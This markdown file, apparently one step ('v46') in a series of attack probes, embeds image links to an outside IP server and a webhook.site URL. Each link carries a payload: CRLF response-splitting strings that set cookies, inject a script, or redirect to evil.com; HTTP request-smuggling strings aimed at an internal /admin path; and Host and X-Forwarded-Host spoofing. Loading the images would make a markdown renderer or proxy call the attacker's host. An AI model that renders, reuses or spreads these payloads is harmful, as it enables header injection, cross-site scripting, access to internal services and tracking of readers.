# v46: Direct IP Server Testing - CRLF & Response Manipulation

> Testing with our own server at 164.90.187.218:8888

---

## 1. Direct IP with CRLF Injection

### Basic test - direct IP
![Direct IP Test](http://164.90.187.218:8888/test.gif)

### CRLF in path - Set-Cookie
![CRLF Cookie](http://164.90.187.218:8888/img.gif%0d%0aSet-Cookie:evil=1)

### CRLF - Content-Type override
![CRLF CT](http://164.90.187.218:8888/img.gif%0d%0aContent-Type:text/html)

### CRLF - Double CRLF for body injection
![CRLF Body](http://164.90.187.218:8888/img.gif%0d%0a%0d%0a<script>alert(1)</script>)

### CRLF - Location redirect
![CRLF Redirect](http://164.90.187.218:8888/img.gif%0d%0aLocation:http://evil.com)

---

## 2. HTTP Request Smuggling via URL

### Classic CL.TE attempt
![Smuggle 1](http://164.90.187.218:8888/img.gif%20HTTP/1.1%0d%0aHost:internal%0d%0aContent-Length:0%0d%0a%0d%0aGET%20/admin)

### HTTP/1.0 downgrade
![HTTP10](http://164.90.187.218:8888/img.gif%20HTTP/1.0%0d%0a%0d%0a)

### Chunked TE smuggle
![Chunked](http://164.90.187.218:8888/img.gif%0d%0aTransfer-Encoding:chunked%0d%0a%0d%0a0)

---

## 3. Host Header Manipulation

### Host in URL path
![Host Path](http://164.90.187.218:8888/img.gif%0d%0aHost:localhost)

### X-Forwarded-Host
![XFH](http://164.90.187.218:8888/img.gif%0d%0aX-Forwarded-Host:127.0.0.1)

---

## 4. Control Test

### Simple webhook (should always work)
![Control](https://webhook.site/3ccdbc1c-1204-4259-942d-2be6937d8dd1/v46-control.gif)

---

## 5. Mixed Protocol Tests

### HTTP on webhook (already tested HTTPS)
![HTTP Webhook](http://webhook.site/3ccdbc1c-1204-4259-942d-2be6937d8dd1/v46-http.gif)

### Direct IP no port
![IP No Port](http://164.90.187.218/no-port.gif)

### Direct IP alt port
![IP Alt Port](http://164.90.187.218:80/port80.gif)

---

**v46 - Testing with controlled server for CRLF response splitting**
